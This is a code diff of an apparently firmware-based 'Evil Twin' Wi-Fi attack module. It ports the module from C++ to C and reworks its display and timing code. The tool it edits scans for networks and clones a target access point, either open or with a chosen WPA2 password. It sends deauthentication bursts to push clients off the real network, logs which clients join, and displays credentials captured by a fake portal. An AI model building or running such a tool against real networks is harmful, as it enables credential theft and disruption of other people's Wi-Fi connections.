@@ -1,5 +1,5 @@
 /*
- * wifi_eviltwin.cpp - Evil Twin sub-application.
+ * wifi_eviltwin.c - Evil Twin sub-application.
  *
  * Flow:
  *   ET_SCAN    - async AP scan (spinner)
@@ -27,16 +27,14 @@
 
 #include "wifi_eviltwin.h"
 
-extern "C" {
 #include "bs/bs_wifi.h"
 #include "bs/bs_gfx.h"
 #include "bs/bs_nav.h"
 #include "bs/bs_theme.h"
 #include "bs/bs_ui.h"
 #include "bs/bs_arch.h"
-}
+#include "bs/bs_board.h"
 
-#include "esp_wifi.h"
 
 #include <string.h>
 #include <stdio.h>
@@ -51,6 +49,7 @@ extern "C" {
 #define ET_LOG_LINES       5
 #define ET_LOG_LEN        48
 #define ET_REFRESH_MS    1000
+#define ET_ANIM_MS         80
 #define ET_DEAUTH_BURST    3   /* frames per tick per direction              */
 
 static const char k_pw_charset[] =
@@ -173,8 +172,8 @@ static void draw_scan(void) {
 }
 
 static void draw_select(void) {
-    int ts  = bs_ui_text_scale();
-    int ts2 = ts > 1 ? ts - 1 : 1;
+    float ts  = bs_ui_text_scale();
+    float ts2 = ts > 1.0f ? ts - 1.0f : 1.0f;
     int sw  = bs_gfx_width();
     int cy  = bs_ui_content_y();
     int lh  = bs_gfx_text_h(ts) + 3;
@@ -203,7 +202,7 @@ static void draw_select(void) {
                      bs_wifi_auth_str(s_aps[idx].auth),
                      s_aps[idx].rssi);
             bs_color_t col = hl ? g_bs_theme.accent : g_bs_theme.primary;
-            bs_gfx_text(4, y, buf, col, ts);
+            bs_ui_draw_text_box(4, y, sw - 8, buf, col, ts, hl);
         }
     }
 
@@ -226,15 +225,15 @@ static void draw_passwd(void) {
     char buf[80];
     snprintf(buf, sizeof(buf), "Target: %.38s",
              s_target.ssid[0] ? s_target.ssid : "<hidden>");
-    bs_gfx_text(8, y, buf, g_bs_theme.dim, ts2);
+    bs_ui_draw_text_box(8, y, sw - 16, buf, g_bs_theme.dim, ts2, true);
     y += lh2 + 2;
 
     snprintf(buf, sizeof(buf), "Auth: %s  ch%d",
              bs_wifi_auth_str(s_target.auth), s_target.channel);
-    bs_gfx_text(8, y, buf, g_bs_theme.dim, ts2);
+    bs_ui_draw_text_box(8, y, sw - 16, buf, g_bs_theme.dim, ts2, true);
     y += lh2 + 4;
 
-    bs_gfx_text(8, y, "Password:", g_bs_theme.dim, ts2);
+    bs_ui_draw_text_box(8, y, sw - 16, "Password:", g_bs_theme.dim, ts2, true);
     y += lh2 + 2;
 
     /* Character editor row */
@@ -271,7 +270,7 @@ static void draw_passwd(void) {
         pw_len = (int)strlen(tp);
         snprintf(buf, sizeof(buf), "len:%d  pos:%d  '%c'",
                  pw_len, s_passwd_pos + 1, s_passwd[s_passwd_pos]);
-        bs_gfx_text(8, y, buf, g_bs_theme.dim, ts2);
+        bs_ui_draw_text_box(8, y, sw - 16, buf, g_bs_theme.dim, ts2, true);
     }
 
     bs_ui_draw_hint("UP/DN=char  L/R=move  SEL=WPA2  BACK=open");
@@ -279,8 +278,9 @@ static void draw_passwd(void) {
 }
 
 static void draw_running(void) {
-    int ts  = bs_ui_text_scale();
-    int ts2 = ts > 1 ? ts - 1 : 1;
+    float ts  = bs_ui_text_scale();
+    float ts2 = ts > 1.0f ? ts - 1.0f : 1.0f;
+    int sw  = bs_gfx_width();
     int y   = bs_ui_content_y();
     int lh  = bs_gfx_text_h(ts)  + 4;
     int lh2 = bs_gfx_text_h(ts2) + 3;
@@ -292,14 +292,13 @@ static void draw_running(void) {
     snprintf(buf, sizeof(buf), "%.30s  ch%d",
              s_target.ssid[0] ? s_target.ssid : "<hidden>",
              s_target.channel);
-    bs_gfx_text(8, y, buf, g_bs_theme.accent, ts);
+    bs_ui_draw_text_box(8, y, sw - 16, buf, g_bs_theme.accent, ts, true);
     y += lh;
 
-    wifi_sta_list_t sta = {};
-    esp_wifi_ap_get_sta_list(&sta);
+    int n_clients = wifi_portal_client_count();
     snprintf(buf, sizeof(buf), "Clients:%d  Deauth:%lu",
-             sta.num, (unsigned long)s_deauth_total);
-    bs_gfx_text(8, y, buf, g_bs_theme.primary, ts2);
+             n_clients < 0 ? 0 : n_clients, (unsigned long)s_deauth_total);
+    bs_ui_draw_text_box(8, y, sw - 16, buf, g_bs_theme.primary, ts2, true);
     y += lh2 + 2;
 
     int n_creds = wifi_portal_cred_count();
@@ -307,11 +306,11 @@ static void draw_running(void) {
         const wifi_portal_cred_t* last = wifi_portal_get_cred(n_creds - 1);
         snprintf(buf, sizeof(buf), "Creds:%d  %.16s/%.16s",
                  n_creds, last ? last->user : "", last ? last->pass : "");
-        bs_gfx_text(8, y, buf, g_bs_theme.accent, ts2);
+        bs_ui_draw_text_box(8, y, sw - 16, buf, g_bs_theme.accent, ts2, true);
         y += lh2;
     }
 
-    bs_gfx_fill_rect(4, y, bs_gfx_width() - 8, 1, g_bs_theme.dim);
+    bs_gfx_fill_rect(4, y, sw - 8, 1, g_bs_theme.dim);
     y += 4;
 
     int hint_h = bs_gfx_text_h(ts2) + 6;
@@ -322,7 +321,7 @@ static void draw_running(void) {
         bs_color_t c = (i == s_log_count - 1) ? g_bs_theme.primary : g_bs_theme.dim;
         int ly = y + i * lh2;
         if (ly + lh2 > max_y) break;
-        bs_gfx_text(8, ly, s_log[idx], c, ts2);
+        bs_ui_draw_text_box(8, ly, sw - 16, s_log[idx], c, ts2, true);
     }
 
     bs_ui_draw_hint("BACK=stop");
@@ -331,7 +330,7 @@ static void draw_running(void) {
 
 /* ── Main entry ──────────────────────────────────────────────────────────── */
 
-extern "C" void wifi_eviltwin_run(const bs_arch_t* arch) {
+void wifi_eviltwin_run(const bs_arch_t* arch) {
     s_phase         = ET_SCAN;
     s_cursor        = 0;
     s_scroll        = 0;
@@ -349,30 +348,35 @@ extern "C" void wifi_eviltwin_run(const bs_arch_t* arch) {
 
     uint32_t last_scan_draw  = 0;
     uint32_t last_refresh    = 0;
+    uint32_t last_anim_ms    = 0;
 
+    uint32_t prev_ms = arch->millis();
     for (;;) {
         uint32_t now = arch->millis();
+        bs_ui_advance_ms(now - prev_ms);
+        prev_ms = now;
 
         /* ── Portal service (RUNNING) ───────────────────────────────────── */
         if (s_phase == ET_RUNNING) {
             if (wifi_portal_active()) {
                 wifi_portal_poll();
 
-                wifi_sta_list_t sta = {};
-                esp_wifi_ap_get_sta_list(&sta);
-                if (sta.num > s_prev_clients) {
-                    for (int i = s_prev_clients; i < (int)sta.num; i++) {
-                        et_log("Client %02X:%02X:%02X:.. joined",
-                               sta.sta[i].mac[0],
-                               sta.sta[i].mac[1],
-                               sta.sta[i].mac[2]);
+                bs_wifi_sta_t sta[8];
+                int sta_count = bs_wifi_ap_client_list(sta, 8);
+                if (sta_count < 0) sta_count = 0;
+                if (sta_count > s_prev_clients) {
+                    for (int i = s_prev_clients; i < sta_count; i++) {
+                         et_log("Client %02X:%02X:%02X:.. joined",
+                               sta[i].mac[0],
+                               sta[i].mac[1],
+                               sta[i].mac[2]);
                     }
                     s_dirty = true;
-                } else if (sta.num < s_prev_clients) {
+                } else if (sta_count < s_prev_clients) {
                     et_log("Client disconnected");
                     s_dirty = true;
                 }
-                s_prev_clients = sta.num;
+                s_prev_clients = sta_count;
             }
 
             deauth_tick();
@@ -428,7 +432,7 @@ extern "C" void wifi_eviltwin_run(const bs_arch_t* arch) {
                         s_phase = ET_PASSWD;
                     } else {
                         /* Open: launch immediately */
-                        if (wifi_portal_start(s_target.ssid, s_target.channel, nullptr)) {
+                        if (wifi_portal_start(s_target.ssid, s_target.channel, NULL)) {
                             et_log("Clone open ch%d  %.20s",
                                    s_target.channel, s_target.ssid);
                             s_deauth_total = 0;
@@ -458,10 +462,10 @@ extern "C" void wifi_eviltwin_run(const bs_arch_t* arch) {
                 } else if (nav == BS_NAV_RIGHT) {
                     if (s_passwd_pos < ET_MAX_PASS_LEN - 1) { s_passwd_pos++; s_dirty = true; }
                 } else if (nav == BS_NAV_SELECT || nav == BS_NAV_BACK) {
-                    const char* pw   = (nav == BS_NAV_SELECT) ? trimmed_passwd() : nullptr;
+                    const char* pw   = (nav == BS_NAV_SELECT) ? trimmed_passwd() : NULL;
                     bool use_wpa2    = (pw && strlen(pw) >= 8);
                     if (wifi_portal_start(s_target.ssid, s_target.channel,
-                                          use_wpa2 ? pw : nullptr)) {
+                                          use_wpa2 ? pw : NULL)) {
                         if (use_wpa2)
                             et_log("Clone WPA2 ch%d  %.18s",
                                    s_target.channel, s_target.ssid);
@@ -491,8 +495,11 @@ extern "C" void wifi_eviltwin_run(const bs_arch_t* arch) {
             }
         }
 
+        bool anim_due = bs_ui_carousel_enabled()
+                     && (uint32_t)(now - last_anim_ms) >= (uint32_t)ET_ANIM_MS;
+
         /* ── Draw ───────────────────────────────────────────────────────── */
-        if (s_dirty) {
+        if (s_dirty || anim_due) {
             s_dirty = false;
             switch (s_phase) {
             case ET_SCAN:    draw_scan();    break;
@@ -500,14 +507,18 @@ extern "C" void wifi_eviltwin_run(const bs_arch_t* arch) {
             case ET_PASSWD:  draw_passwd();  break;
             case ET_RUNNING: draw_running(); break;
             }
+            if (anim_due) last_anim_ms = now;
         }
 
         if (s_phase == ET_RUNNING && (now - last_refresh) >= (uint32_t)ET_REFRESH_MS) {
             last_refresh = now;
-            draw_running();
+            s_dirty = true;
         }
 
-        arch->delay_ms(s_phase == ET_RUNNING ? 5 : 10);
+        if (bs_board_caps() & BS_BOARD_CAP_FAST_UI)
+            arch->delay_ms(s_phase == ET_RUNNING ? 2 : 1);
+        else
+            arch->delay_ms(s_phase == ET_RUNNING ? 5 : 10);
     }
 }
 
